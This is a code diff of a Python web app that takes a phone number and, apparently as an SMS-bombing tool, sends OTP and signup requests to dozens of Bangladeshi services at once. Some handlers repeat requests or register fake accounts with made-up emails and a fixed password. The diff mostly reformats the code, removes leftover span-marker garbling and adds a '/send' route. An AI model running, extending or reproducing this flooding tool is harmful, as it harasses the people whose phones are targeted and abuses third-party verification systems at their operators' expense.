@@ -27,9 +27,17 @@ async def safe_request(
     try:
         async with session.request(method, url, ssl=False, **kwargs) as response:
             text = await response.text()
-            return {"api": name, "status": response.status, "response": text}
+            return {
+                "api": name,
+                "status": response.status,
+                "response": text,
+            }
     except Exception as e:
-        return {"api": name, "status": "error", "error": str(e)}
+        return {
+            "api": name,
+            "status": "error",
+            "error": str(e),
+        }
 
 
 # RedX
@@ -198,7 +206,10 @@ async def hit_api12(session: aiohttp.ClientSession, phone: str) -> dict:
 async def hit_api15(session: aiohttp.ClientSession, phone: str) -> dict:
     app_id = "8329815A6D1AE6DD"
     token_res = await safe_request(
-        session, "api15_sheba_token", "GET", f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
+        session,
+        "api15_sheba_token",
+        "GET",
+        f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}",
     )
     api_token = ""
     try:
@@ -305,15 +316,15 @@ async def hit_api31(session: aiohttp.ClientSession, phone: str) -> dict:
     payload = {"deviceId": f"35{phone}30", "msisdn": phone, "tran_type": "OTPREQSIGNUP"}
     return await safe_request(
         session, "api31_gpay", "POST", url, json=payload, headers={"Content-Type": "application/json"}
-    )[span_10](start_span)[span_10](end_span)
+    )
 
 
 async def hit_api32(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_applink(session, "api32_applink", phone)[span_11](start_span)[span_11](end_span)
+    return await _hit_applink(session, "api32_applink", phone)
 
 
 async def hit_api32_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_applink(session, "api32_2_applink", phone)[span_12](start_span)[span_12](end_span)
+    return await _hit_applink(session, "api32_2_applink", phone)
 
 
 # Priyo Shikkhaloy
@@ -324,21 +335,25 @@ async def hit_api33(session: aiohttp.ClientSession, phone: str) -> dict:
         "Accept-Encoding": "gzip",
         "Content-Type": "application/x-www-form-urlencoded",
     }
-    return await safe_request(session, "api33_priyoshikkhaloy", "POST", url, data={"mobile": phone}, headers=headers)[span_13](start_span)[span_13](end_span)
+    return await safe_request(
+        session, "api33_priyoshikkhaloy", "POST", url, data={"mobile": phone}, headers=headers
+    )
 
 
 async def hit_api35(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_salextra(session, "api35_salextra", phone)[span_14](start_span)[span_14](end_span)
+    return await _hit_salextra(session, "api35_salextra", phone)
 
 
 async def hit_api35_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_salextra(session, "api35_2_salextra", phone)[span_15](start_span)[span_15](end_span)
+    return await _hit_salextra(session, "api35_2_salextra", phone)
 
 
 # Sundora
 async def hit_api36(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.sundora.com.bd/api/user/customer/"
-    formatted_phone = "+880" + phone[1:] if len(phone) > 1 and phone.startswith("0") else f"+88{phone}"
+    formatted_phone = (
+        "+880" + phone[1:] if len(phone) > 1 and phone.startswith("0") else f"+88{phone}"
+    )
     payload = {
         "customer": {
             "email": f"kgjkgjgg{phone}@gmail.com",
@@ -362,7 +377,7 @@ async def hit_api36(session: aiohttp.ClientSession, phone: str) -> dict:
         "Content-Type": "application/json",
         "Origin": "https://sundora.com.bd",
     }
-    return await safe_request(session, "api36_sundora", "POST", url, json=payload, headers=headers)[span_16](start_span)[span_16](end_span)
+    return await safe_request(session, "api36_sundora", "POST", url, json=payload, headers=headers)
 
 
 # MyGP Cinematic OTP
@@ -378,19 +393,25 @@ async def hit_api37(session: aiohttp.ClientSession, phone: str) -> dict:
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
         "Content-Type": "application/json",
     }
-    return await safe_request(session, "api37_mygp_otp", "POST", url, json=payload, headers=headers)[span_17](start_span)[span_17](end_span)
+    return await safe_request(session, "api37_mygp_otp", "POST", url, json=payload, headers=headers)
 
 
 # Meena Bazar
 async def hit_api41(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={quote(phone)}&type=login"
-    headers = {"User-Agent": "Dart/3.2 (dart:io)", "Accept-Encoding": "gzip", "content-type": "application/json"}
+    headers = {
+        "User-Agent": "Dart/3.2 (dart:io)",
+        "Accept-Encoding": "gzip",
+        "content-type": "application/json",
+    }
     return await safe_request(session, "api41_meenabazar", "POST", url, headers=headers)
 
 
 # Iqra Live
 async def hit_api43(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await safe_request(session, "api43_iqralive", "GET", f"http://apibeta.iqra-live.com/api/v1/sent-otp/{quote(phone)}")
+    return await safe_request(
+        session, "api43_iqralive", "GET", f"http://apibeta.iqra-live.com/api/v1/sent-otp/{quote(phone)}"
+    )
 
 
 # RedX (Alt payload)
@@ -453,8 +474,12 @@ async def hit_api52(session: aiohttp.ClientSession, phone: str) -> dict:
         "dob": "",
         "otp": None,
     }
-    headers = {"User-Agent": "Dart/3.1 (dart:io)", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
-    return await safe_request(session, "api52_kfcbd", "POST", url, json=payload, headers=headers)[span_18](start_span)[span_18](end_span)
+    headers = {
+        "User-Agent": "Dart/3.1 (dart:io)",
+        "Accept-Encoding": "gzip",
+        "Content-Type": "application/json",
+    }
+    return await safe_request(session, "api52_kfcbd", "POST", url, json=payload, headers=headers)
 
 
 # Grameenphone Offer Send OTP
@@ -468,7 +493,7 @@ async def hit_api53(session: aiohttp.ClientSession, phone: str) -> dict:
         "lang": "en",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api53_gp_offer", "POST", url, json={"msisdn": phone}, headers=headers)[span_19](start_span)[span_19](end_span)
+    return await safe_request(session, "api53_gp_offer", "POST", url, json={"msisdn": phone}, headers=headers)
 
 
 # Eat-Z
@@ -487,11 +512,11 @@ async def hit_api55(session: aiohttp.ClientSession, phone: str) -> dict:
 
 
 async def hit_api56(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_osudpotro(session, "api56_osudpotro", phone)[span_20](start_span)[span_20](end_span)
+    return await _hit_osudpotro(session, "api56_osudpotro", phone)
 
 
 async def hit_api56_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    return await _hit_osudpotro(session, "api56_2_osudpotro", phone)[span_21](start_span)[span_21](end_span)
+    return await _hit_osudpotro(session, "api56_2_osudpotro", phone)
 
 
 # Kormi24 GraphQL
@@ -536,7 +561,7 @@ async def hit_api58(session: aiohttp.ClientSession, phone: str) -> dict:
         safe_request(session, f"api58_gp_weblogin_{i+1}", "POST", url, json={"msisdn": phone}, headers=headers)
         for i in range(5)
     ]
-    return {"api": "api58_gp_weblogin_x5", "responses": await asyncio.gather(*sub_tasks)}[span_22](start_span)[span_22](end_span)
+    return {"api": "api58_gp_weblogin_x5", "responses": await asyncio.gather(*sub_tasks)}
 
 
 # Shwapno
@@ -549,7 +574,9 @@ async def hit_api59(session: aiohttp.ClientSession, phone: str) -> dict:
         "referer": "https://www.shwapno.com/",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api59_shwapno", "POST", url, json={"phoneNumber": f"+88{phone}"}, headers=headers)
+    return await safe_request(
+        session, "api59_shwapno", "POST", url, json={"phoneNumber": f"+88{phone}"}, headers=headers
+    )
 
 
 # MyBL (Banglalink)
@@ -587,7 +614,11 @@ async def hit_api65(session: aiohttp.ClientSession, phone: str) -> dict:
         "fcmToken": "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR",
         "referral": "",
     }
-    headers = {"User-Agent": "okhttp/4.9.2", "Accept-Encoding": "gzip", "Content-Type": "application/x-www-form-urlencoded"}
+    headers = {
+        "User-Agent": "okhttp/4.9.2",
+        "Accept-Encoding": "gzip",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
     return await safe_request(session, "api65_arogga_app", "POST", url, data=form_data, headers=headers)
 
 
@@ -599,7 +630,11 @@ async def hit_api71(session: aiohttp.ClientSession, phone: str) -> dict:
         "POST",
         "https://fabrilife.com/api/wp-json/wc/v2/user/register",
         json={"name": random_name(), "email": f"{phone}@gmail.com", "phone": phone, "password": "Riyaz@123"},
-        headers={"User-Agent": "okhttp/3.12.12", "Accept-Encoding": "gzip", "Content-Type": "application/json"},
+        headers={
+            "User-Agent": "okhttp/3.12.12",
+            "Accept-Encoding": "gzip",
+            "Content-Type": "application/json",
+        },
     )
     otp_res = await safe_request(
         session,
@@ -624,7 +659,11 @@ async def hit_api72(session: aiohttp.ClientSession, phone: str) -> dict:
         "POST",
         "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus",
         json={"deviceId": device_id, "recipient": f"+88{phone}"},
-        headers={"User-Agent": "okhttp/4.12.0", "Accept-Encoding": "gzip", "Content-Type": "application/json; charset=UTF-8"},
+        headers={
+            "User-Agent": "okhttp/4.12.0",
+            "Accept-Encoding": "gzip",
+            "Content-Type": "application/json; charset=UTF-8",
+        },
     )
     token = None
     try:
@@ -656,10 +695,19 @@ async def hit_api72(session: aiohttp.ClientSession, phone: str) -> dict:
 
 
 @app.route("/", methods=["GET"])
+@app.route("/send", methods=["GET"])
 async def send_all_requests():
-    phone = request.args.get("phone")
+    phone = (request.args.get("phone") or "").strip()
     if not phone:
-        return jsonify({"status": "error", "message": "Please provide a phone parameter. Example: /?phone=01700000000"}), 400
+        return (
+            jsonify(
+                {
+                    "status": "error",
+                    "message": "Please provide a phone parameter. Example: /send?phone=01700000000",
+                }
+            ),
+            400,
+        )
 
     start_time = time.perf_counter()
     connector = aiohttp.TCPConnector(limit=75, ssl=False)
